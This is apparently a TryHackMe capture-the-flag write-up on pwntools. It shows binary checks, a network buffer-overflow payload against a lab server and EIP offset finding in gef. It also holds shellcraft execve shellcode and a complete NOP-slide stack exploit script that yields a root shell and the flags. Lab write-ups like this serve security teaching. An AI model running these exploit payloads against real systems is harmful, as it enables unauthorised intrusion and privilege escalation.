
# THM Intro To PwnTools
## A reverse engineering room in C

```bash

┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/checksec]
└─# checksec intro2pwn1        
[*] '/root/CTF/THM/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
                                                                                                                             
┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/checksec]
└─# checksec intro2pwn2
[*] '/root/CTF/THM/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```



## Server Challenge


```ruby

└─# checksec serve_test         
[*] '/root/CTF/THM/IntroToPwntools/IntroToPwntools/networking/serve_test'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
                                                                   
┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/networking]
└─# file serve_test
serve_test: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=00e0486f64bcf0aaa632eca2a4611e5a0c9762ac, not stripped

```

```bash

└─# strings serve_test     
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
socket
exit
htonl
----- snip-------
_ITM_registerTMCloneTable
UWVS
[^_]
Give me deadbeef: 
From client: %s	 
Thank you!
flag{*****************}

```

We need exact byte counts of what the server sends. In this case the number of characters in the strings "Give me deadbeef: " and "Thank you!
flag{*****************}" Note: the newline (counted as one byte). The use of the -n flag ( no -new line) ensures an accurate
byte count cause the echo command adds a new line by default.

```bash

┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/networking]
└─# echo -n 'Give me deadbeef: ' | wc -c
18
                                                                 
┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/networking]
└─# echo -n 'Thank you!                 
flag{*****************}' | wc -c
34

```


```bash

└─# ./serve_test
Socket successfully created..
Socket successfully binded..
Server listening..
server acccept the client...
From client: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�	 

```

using the python3 interpreter, we can run commands against the binary by setting it up as a server from our own machine on port 1336. 
The binary is hardcoded to run on port 1336 and 1337 remotely.

```python 

>>> from pwn import *
>>> connect = remote('127.0.0.1',1336)
[x] Opening connection to 127.0.0.1 on port 1336
[x] Opening connection to 127.0.0.1 on port 1336: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 1336: Done
>>> print(connect.recvn(18))
b'Give me deadbeef: '
>>> payload = b"a"*32
>>> payload += p32(0xdeadbeef)
>>> connect.send(payload)
>>> print(connect.recvn(34))
b'Thank you!\nflag{*****************}'
>>> connect.close()
[*] Closed connection to 127.0.0.1 port 1336


```python

└─# python3
Python 3.9.9 (main, Nov 16 2021, 10:24:31) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> connect = remote('10.10.253.254',1337)
[x] Opening connection to 10.10.253.254 on port 1337
[x] Opening connection to 10.10.253.254 on port 1337: Trying 10.10.253.254
[+] Opening connection to 10.10.253.254 on port 1337: Done
>>> print(connect.recvn(18))
b'Give me deadbeef: '
>>> payload = b"a"*32
>>> payload += p32(0xdeadbeef)
>>> connect.send(payload)
>>> print(connect.recvn(34))
b'Thank you!\nflag{n3tw0rk!ng_!$_fun}'

```

## ShellCraft

```bash

┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/shellcraft]
└─# file intro2pwnFinal 
intro2pwnFinal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9b3973ea8815c8ff78996ab1b3bcd48d3492ba8a, not stripped
                                                                   
┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/shellcraft]
└─# checksec intro2pwnFinal 
[*] '/root/CTF/THM/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

## Locate the EIP

```python

gef➤  r < test1
Starting program: /root/CTF/THM/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < test1
Hello There. Do you have an input for me?

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcf00  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x61616172 ("raaa"?)
$ecx   : 0xf7fa6580  →  0xfbad2098
$edx   : 0xfbad2098
$esp   : 0xffffcf50  →  "uaaavaaawaaaxaaayaaa"
$ebp   : 0x61616173 ("saaa"?)
$esi   : 0x1       
$edi   : 0x8048340  →  <_start+0> xor ebp, ebp
$eip   : 0x61616174 ("taaa"?)





Now we get the $esp address by running our payload (test2) with gef. It is `0xffffcf50`

```bash

gef➤  r < test2
Starting program: /root/CTF/THM/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < test2
Hello There. Do you have an input for me?

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcf00  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x61616172 ("raaa"?)
$ecx   : 0xf7fa6580  →  0xfbad2098
$edx   : 0xfbad2098
$esp   : 0xffffcf50  →  0xffffcf00  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"

```

## Using Shellcraft to create our shell:

```bash

┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/shellcraft]
└─# shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
    /* execve(path='/bin///sh', argv=['sh', '-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push 'sh\x00-p\x00\x00' */
    push 0x70
    push 0x1010101
    xor dword ptr [esp], 0x2c016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 7
    pop ecx
    add ecx, esp
    push ecx /* '-p\x00' */
    push 8
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

                                                                                          
┌──(root💀kali)-[~/…/THM/IntroToPwntools/IntroToPwntools/shellcraft]
└─# shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

```




We can interact with the binary with the python3 interpreter with the process() function. NOTE: using python3 we need to prefix with `b` for bytes cause python3 doesnt allow mixing strings and bytes, python did.

```python

from pwn import *

proc = process('./intro2pwnFinal')

proc.recvline()

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffcf50+200)

nop_slide = b"\x90"*1000

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)

proc.interactive()

```

## Demoed on remote THM machine, using python 2

```python

      -----snip---------
>>> payload = padding + eip + nop_slide + shellcode
>>> proc = process('./intro2pwnFinal')
[x] Starting local process './intro2pwnFinal'
[+] Starting local process './intro2pwnFinal': pid 2942
>>> proc.recvline()
'Hello There. Do you have an input for me?\n'
>>> proc.send(payload)
>>> proc.interactive()
[*] Switching to interactive mode
whoami
whoami
root
cd /root
ls -la
total 32
drwx------  4 root root 4096 Jun 10  2021 .
drwxr-xr-x 26 root root 4096 Jun  9  2021 ..
-rw-------  1 root root   28 May 19  2021 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jun  9  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 19  2021 .ssh
-rw-rw-r--  1 root buzz   24 Jun 10  2021 flag.txt
cat flag.txt
flag{pwn!ng_!$_fr33d0m}

```
